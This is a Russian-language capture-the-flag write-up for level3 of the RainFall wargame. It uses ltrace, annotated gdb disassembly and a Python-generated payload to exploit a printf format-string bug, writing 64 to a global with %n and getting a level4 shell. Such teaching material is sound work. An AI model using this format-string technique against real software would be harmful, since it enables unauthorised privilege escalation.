# Решение
python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/vzlom
level3@RainFall:~$ cat /tmp/vzlom - | ./level3
cd ../level4
cat .pass
b209***6fa

# Объяснение
1. Оценим поведение программы.
level3@RainFall:~$ ./level3
asd
asd
level3@RainFall:~$ ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Принимает символы на стандартный ввод и выводит их на стандартный вывод.
Буффер не переполняется.

2. ltrace
level3@RainFall:~$ ltrace ./level3
__libc_start_main(0x804851a, 1, 0xbffff6f4, 0x8048530, 0x80485a0 <unfinished ...>
fgets(a
"a\n", 512, 0xb7fd1ac0)                            = 0xbffff440
printf("a\n"a
)                                            = 2
+++ exited (status 0) +++

Как видим, используется защищенная версия gets - fgets. Которая имеет ограничение по считываемым символам.
Затем, введенная нами последовательность символов выводится через принтф, помещаясь в управляющую строку - небезопасно.

3. GDB
(gdb) disas main
В main из полезного видим только вызов функции v.
   0x08048520 <+6>:	call   0x80484a4 <v>

(gdb) disas v
   0x080484a4 <+0>:	    push   %ebp                   // пролог
   0x080484a5 <+1>:	    mov    %esp,%ebp
   0x080484a7 <+3>:	    sub    $0x218,%esp            // выделяем 536 байт на стеке
   0x080484ad <+9>:	    mov    0x8049860,%eax         // кладем адрес stdin в регистр EAX (x/x 0x8049860)
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)         // кладем адрес stdin из EAX по адресу лежащему в регистре ESP + 8 (3 арг)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)       // кладем 512 по адресу лежащему в ESP + 4 (2 арг)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax      // кладем адрес, лежащий в EBP - 520 в регистр EAX
   0x080484c4 <+32>:	mov    %eax,(%esp)            // кладем адрес из EAX по адресу, лежащему в ESP (1 арг)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>  // Вызываем fgets с аргументами 1,2,3, которые указаны выше
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax      // кладем адрес, лежащий в EBP, -520 в регистр EAX
   0x080484d2 <+46>:	mov    %eax,(%esp)            // кладем адрес из регистра EAX по адрему, лежащему в ESP. (1 арг)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt> // вызываем printf с аргументом-буфером. (указан выше)
   0x080484da <+54>:	mov    0x804988c,%eax         // кладем значение из адреса 0x804988c(глобальная переменная m) в регистр EAX
   0x080484df <+59>:	cmp    $0x40,%eax             // сравниваем значение 64 и значение из регистра EAX
   0x080484e2 <+62>:	jne    0x8048518 <v+116>      // если значение не равны, перемещаемся на <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax         // кладем адрес stdout в регистр EAX
   0x080484e9 <+69>:	mov    %eax,%edx              // кладем значение из регистра EAX в регистр EDX
   0x080484eb <+71>:	mov    $0x8048600,%eax        // кладем $0x8048600 в регистр EAX. По адресу лежит строка "Wait what?!\n" (x/12cb 0x8048600)
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)         // кладем значение из EDX (stdout) на стек (4 аргумент)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)         // кладем 12 на стек (3 аргумент)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)         // кладем 1 на стек (2 аргумент)
   0x08048504 <+96>:	mov    %eax,(%esp)            // кладем на стек адрес строки "Wait what?!\n" (1 аргумент)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt> // вызываем функцию fwrite с 4 аргументами, указанными выше
   0x0804850c <+104>:	movl   $0x804860d,(%esp)      // кладем на вершину стека адрес строки "bin/sh" (x/8cb 0x804860d)
   0x08048513 <+111>:	call   0x80483c0 <system@plt> // вызываем функцию system с аргументом "bin/sh"
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret

Из функции мы понимаем, что нам необходимо изменить значение переменной m <0x804988c> на 64, чтобы пройти проверку
на строке +62 и дойти до выполнения функции system("bin/sh") <+111> от пользователя level4.

Глобальную переменную можно увидеть через команду info variables.

Эксплуатируем уязвимость форматной строки printf.
- Мы можем выводить память на стеке, указывай спецификаторы в командной строке, тк printf не проверяет
количество аргументов, которые ему были переданы.
- существует спецификатор %n, который записывает количество выведенных символов по адресу, который указан
как аргумент для printf.
- существует возможность указать номер аргумента, который будет использоваться спецификатором.
%2$x - вывести второй аргумент как шестнадцатеричное число.

Наша задача вывести 64 символа и записать число 64 по адресу 0x804988c.

Чтобы понять, как обратиться к адресу, нам надо знать, где он будет лежать на стеке.
Сделаем проверку:
level3@RainFall:~$ python -c 'print "AAAA %x %x %x %x"' > /tmp/test
level3@RainFall:~$ cat /tmp/test | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 -- 0x41 - символ "A" по тпблице ASCII
Как видим, символы AAAA являются 4 аргументом.

Готовим атаку:
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/vzlom

Ломаем:
level3@RainFall:~$ cat /tmp/vzlom - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
